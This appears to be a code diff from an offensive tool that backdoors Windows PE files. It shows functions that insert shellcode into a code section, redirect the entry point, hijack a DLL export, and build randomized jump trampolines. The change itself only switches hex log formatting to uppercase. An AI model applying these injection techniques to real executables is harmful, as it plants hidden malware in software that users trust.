@@ -46,7 +46,7 @@ Code section size : {sect_size}
 ''')
 
         offset = int((sect_size - len(self.shellcodeData)) / 2)
-        logger.debug(f'Inserting shellcode into 0x{offset:x} offset.')
+        logger.debug(f'Inserting shellcode into 0x{offset:X} offset.')
 
         self.superpe.pe.set_bytes_at_offset(offset, self.shellcodeData)
         self.shellcodeOffset = offset
@@ -66,7 +66,7 @@ Trailing {sect_name} bytes:
 {hexdump(self.superpe.pe.get_data(self.superpe.pe.get_rva_from_offset(p)), p, 64)}
 ''', '\t')
 
-        logger.info(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
+        logger.info(f'Shellcode injected into existing code section at RVA 0x{rva:X}')
         logger.debug(graph)
         return True
 
@@ -76,7 +76,7 @@ Trailing {sect_name} bytes:
             rva = self.superpe.pe.get_rva_from_offset(self.shellcodeOffset)
             self.superpe.set_entrypoint(rva)
 
-            logger.info(f'Address Of Entry Point changed to: RVA 0x{rva:x}')
+            logger.info(f'Address Of Entry Point changed to: RVA 0x{rva:X}')
             return True
 
         elif self.runMode == InjectStyle.BackdoorCallInstr:
@@ -114,7 +114,7 @@ Trailing {sect_name} bytes:
             if export[1].lower() == exportName.lower():
 
                 addr = self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
-                logger.info(f'Found DLL Export "{exportName}" at RVA 0x{addr:x} . Attempting to hijack it...')
+                logger.info(f'Found DLL Export "{exportName}" at RVA 0x{addr:X} . Attempting to hijack it...')
                 return addr
 
         return -1
@@ -188,7 +188,7 @@ Trailing {sect_name} bytes:
         while reg2 == reg:
             reg2 = random.choice(registers).upper()
 
-        enc, count = ks.asm(f'MOV {reg}, 0x{self.shellcodeAddr:x}')
+        enc, count = ks.asm(f'MOV {reg}, 0x{self.shellcodeAddr:X}')
         for instr2 in cs.disasm(bytes(enc), 0):
             addrOffset = len(instr2.bytes) - instr2.addr_size
             break
@@ -197,7 +197,7 @@ Trailing {sect_name} bytes:
         found |= instr.mnemonic.lower() == 'call'
 
         if found:
-            logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:x} into:')
+            logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:X} into:')
 
             jump = random.choice([
                 f'CALL {reg}',
@@ -211,7 +211,7 @@ Trailing {sect_name} bytes:
                 #f'PUSH {reg} ; RET',
             ])
 
-            trampoline = f'MOV {reg}, 0x{self.shellcodeAddr:x} ; {jump}'
+            trampoline = f'MOV {reg}, 0x{self.shellcodeAddr:X} ; {jump}'
 
         for ins in trampoline.split(';'):
             logger.info(f'\t{ins.strip()}')
